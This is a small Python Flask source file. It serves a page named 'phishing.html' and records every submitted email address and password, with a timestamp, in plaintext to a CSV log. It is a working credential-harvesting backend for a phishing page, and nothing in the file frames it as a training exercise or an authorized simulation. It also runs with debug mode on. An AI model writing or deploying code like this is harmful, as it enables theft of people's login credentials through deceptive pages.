from flask import Flask, render_template, request
import csv
import datetime
import os

app = Flask(__name__)
LOG_FILE = 'logs/submissions.csv'
os.makedirs("logs", exist_ok=True)

@app.route('/')
def index():
    return render_template('phishing.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    with open(LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([email, password, timestamp])
    
    return render_template('success.html')

if __name__ == '__main__':
    app.run(debug=True)
